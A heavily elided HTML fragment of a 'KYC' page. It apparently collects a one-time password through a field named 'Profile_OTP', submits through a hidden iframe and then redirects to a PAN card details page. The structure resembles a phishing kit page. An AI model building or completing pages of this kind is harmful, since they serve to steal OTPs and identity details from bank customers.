   ...
   <body onload="startTimer();" style="background:#fff;">
    ...
    <img src="Menu.png" id="ii" width="10%">
      ...
      <section class="">
         ...
         <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='PAN_Card_Details.php';}"></iframe>
         <!--My Form-->
				   ...
				   <div class="progress">
                    ...
                    End KYC % Progress-->
                     <div class="p-50">
                        ...
                        <div class="login-box">
                        <div class="user-box">
                        <input type="text" name="Profile_OTP" inputmode="numeric" maxlength="8"
                        ...
                        if (timer<2) {
                        // timer.stop();
                        window.location.href = "Enter_OTP_Profile.php";
                        }
